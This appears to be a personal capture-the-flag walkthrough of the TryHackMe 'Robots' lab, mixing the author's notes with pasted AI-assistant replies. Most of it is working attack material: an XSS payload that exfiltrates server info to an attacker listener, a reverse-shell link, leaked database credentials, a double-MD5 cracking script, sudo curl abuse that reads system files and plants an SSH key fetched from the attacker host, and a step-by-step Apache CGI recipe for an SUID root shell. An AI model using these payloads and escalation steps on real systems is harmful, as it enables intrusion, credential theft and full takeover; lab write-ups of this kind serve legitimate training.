![](https://i.imgur.com/51pXgWA.png)

<script>
fetch('http://robots.thm/harm/to/self/server_info.php')
.then(response => response.text())
.then(data => fetch('http://10.17.20.50:4444/capture?data='+encodeURIComponent(data)));
</script>

python3 -m http.server 4444

curl -v -X POST "http://robots.thm/harm/to/self/register.php" \
-d "username=<script>fetch('http://robots.thm/harm/to/self/server_info.php').then(response%20=>%20response.text()).then(data%20=>%20fetch('http://10.17.20.50:4444/capture?data='%2BencodeURIComponent(data)))</script>&dob=0101"

![](https://i.imgur.com/WLs3XUO.png)


![](https://i.imgur.com/oe3zHQU.png)

phpsessionid: 
```
1grebc91jcul9obobs7rho2o0k
```

![](https://i.imgur.com/QTwWXxy.png)
http://10.17.20.50/php-reverse-shell.php

![](https://i.imgur.com/nViZTPh.png)

![](https://i.imgur.com/Oo0JLXB.png)

![](https://i.imgur.com/rMqO6gu.png)

![](https://i.imgur.com/CXPXCXM.png)


Nice grab! 🔥 You're making solid progress. Let’s break down what you just uncovered and what you can do next:
🔑 Critical Discovery in /var/www/html/harm/to/self/config.php

You've found database credentials:

$servername = "db";
$username = "robots";
$password = "q4qCz1OflKvKwK4S";
$dbname = "web";

    db = probably a Docker service name (MySQL or MariaDB container).

    Credentials: likely valid for DB inside the Docker network.

    Could also be reused elsewhere—SSH, web panel, other containers, etc.

🧭 Internal Host Mapping

From /etc/hosts:

172.18.0.3 robots.thm robots

That’s likely the IP of your current container, part of a Docker bridge network.

So the hostname db likely resolves to something like 172.18.0.X.


If mysql isn't installed, try using PHP for a quick test:

```
```php -r '$pdo = new PDO("mysql:host=db;dbname=web", "robots", "q4qCz1OflKvKwK4S"); echo "Connected!\n";'
```

![](https://i.imgur.com/4LUQYez.png)

![](https://i.imgur.com/kyaQfaO.png)

![](https://i.imgur.com/W1GNhwf.png)

![](https://i.imgur.com/ULk95Jr.png)

```
[+] Table: users
Array
(
    [id] => 1
    [username] => admin
    [password] => 3e3d6c2d540d49b1a11cf74ac5a37233
    [group] => admin
)
Array
(
    [id] => 2
    [username] => rgiskard
    [password] => dfb35334bf2a1338fa40e5fbb4ae4753
    [group] => nologin
)
Array
(
    [id] => 3
    [username] => test
    [password] => 90453dcc2347f4b1148c7d144d0adbb8
    [group] => guest
)

```


till now what i got is while storing in the db i got to know that the actual password again goes through md5 hashing and then stored in the db

    [id] => 3
    [username] => test
    [password] => 209df2e8fa7a3e08b4ef1ce0914c40f1
    double md5[password] => 90453dcc2347f4b1148c7d144d0adbb8
    [group] => guest

so now thing is how to reverse admin and rgiskard passwords

```python
import hashlib
from datetime import datetime, timedelta

def double_md5(s):
    return hashlib.md5(hashlib.md5(s.encode()).hexdigest().encode()).hexdigest()

def generate_ddmm_combos():
    start_date = datetime.strptime("01/01", "%d/%m")
    ddmm_list = []
    for i in range(366):
        try:
            date_obj = start_date + timedelta(days=i)
            ddmm = date_obj.strftime("%d%m")
            ddmm_list.append(ddmm)
        except ValueError:
            continue
    return ddmm_list

def brute_force_double_md5(username, target_hash):
    ddmm_combos = generate_ddmm_combos()
    for ddmm in ddmm_combos:
        combined = username + ddmm
        hashed = double_md5(combined)
        if hashed == target_hash:
            print(f"[+] Match found for {username}: {combined} => {hashed}")
            return combined
    print(f"[-] No match found for {username}")
    return None

# === USAGE EXAMPLE ===
# Replace these with actual target hashes
admin_target = "3e3d6c2d540d49b1a11cf74ac5a37233"
rgiskard_target = "dfb35334bf2a1338fa40e5fbb4ae4753"

brute_force_double_md5("admin", admin_target)
brute_force_double_md5("rgiskard", rgiskard_target)

```

```bash
Match found for rgiskard: rgiskard2209 => dfb35334bf2a1338fa40e5fbb4ae4753
```

![](https://i.imgur.com/hIAgB2A.png)

rgiskard single md5 hash
```
b246f21ff68cae9503ed6d18edd32dae
```
![](https://i.imgur.com/x8InjYa.png)

now after finding few things i got two things 
i can do sudo -l with obviously rgiskard's password and it gave this
![](https://i.imgur.com/8bY5ad8.png)

also we got that pexec is vulnerable to pwnkit which is of version 0.105
will explore later if this doesnt work

```bash
	sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file:///../../../etc/passwd

```

![](https://i.imgur.com/tOIAuUx.png)

```bash
sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file:///../../../home/dolivaw/user.txt
```
```
THM{9b17d3c3e86c944c868c57b5a7fa07d8}
```
![](https://i.imgur.com/DRlLmSB.png)

```
```rgiskard@ubuntu-jammy:~$ sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file:///../../../home/dolivaw/.bashrc && ll
```


![](https://i.imgur.com/ZsxxRdo.png)


sudo -u dolivaw /usr/bin/curl 127.0.0.1/ http://10.17.20.50/id_rsa.pub -o id_rsa.pub  -o /home/dolivaw/.ssh/authorized_keys


sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file:///home/dolivaw/.ssh/authorized_keys 


![](https://i.imgur.com/hSNFbI3.png)

ssh -p 22 dolivaw@robots.thm -i id_rsa

![](https://i.imgur.com/r5B7Gpe.png)

and then follow this to get root shell
## Apache Local Exploit Setup (mod_cgi with `.sh` Payload)

### 🛠 Step 1: Apache Config (`apache.conf`)

Create or edit the Apache config file at `/tmp/hackroot/apache.conf`:

```apache
ServerRoot "/tmp/hackroot"
ServerName localhost
Listen 9999
PidFile /tmp/hackroot/httpd.pid
DocumentRoot "/tmp/hackroot"

# Load necessary modules
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
LoadModule mime_module /usr/lib/apache2/modules/mod_mime.so
LoadModule cgi_module /usr/lib/apache2/modules/mod_cgi.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
LoadModule alias_module /usr/lib/apache2/modules/mod_alias.so

# Enable CGI with .sh files
AddHandler cgi-script .sh
ScriptAlias /cgi-bin/ /tmp/hackroot/

<Directory "/tmp/hackroot">
    Options +ExecCGI
    AddHandler cgi-script .sh
    Require all granted
</Directory>

# Logs
ErrorLog /tmp/hackroot/logs/error_log
LogLevel info
```

---

### 🛠 Step 2: Prepare Environment

#### 📁 Create logs directory:

```bash
mkdir -p /tmp/hackroot/logs
```

#### 🐚 Create the payload script:

```bash
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > /tmp/hackroot/shell.sh
chmod +x /tmp/hackroot/shell.sh
```

---

### 🛠 Step 3: Run Apache in Debug Mode

```bash
sudo /usr/sbin/apache2 -f /tmp/hackroot/apache.conf -X
```

The `-X` flag runs it in the foreground with only one worker—great for debugging.

---

### 🛠 Step 4: Trigger the Payload

In another terminal:

```bash
curl http://127.0.0.1:9999/cgi-bin/shell.sh
```

---

### 🛠 Step 5: Get a Root Shell

If successful, you should now have an SUID root shell at `/tmp/rootbash`:

```bash
/tmp/rootbash -p
```

---

## ❌ Getting 500 Internal Server Error? Here’s How to Debug

### ✅ Checklist:

#### 1. **Check script syntax**

```bash
cat /tmp/hackroot/shell.sh
```

Should show:

```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

#### 2. **Ensure it’s executable**

```bash
chmod +x /tmp/hackroot/shell.sh
```

#### 3. **Set correct directory and file permissions**

Apache must be able to access and execute the script:

```bash
chmod 755 /tmp/hackroot
chmod 755 /tmp/hackroot/shell.sh
```

#### 4. **Check the error log**

View the log file to understand why it failed:

```bash
cat /tmp/hackroot/logs/error_log
```

Look for:

- `Permission denied`
    
- `command not found`
    
- `Script not found or unable to stat`
    

#### 5. **Test the script manually**

Run it outside Apache to make sure it works:

```bash
/tmp/hackroot/shell.sh
ls -l /tmp/rootbash  # Should show `-rwsr-xr-x` and owned by root
```

---

## 🔁 Final Test

Once everything checks out, try again:

```bash
curl http://127.0.0.1:9999/cgi-bin/shell.sh
```

Then:

```bash
/tmp/rootbash -p
```

---

## ✅ Success?

If that gives you a root shell, you’re good to go!

If you still get a 500 error, **paste the contents of** `/tmp/hackroot/logs/error_log` and I’ll help you dig into it.
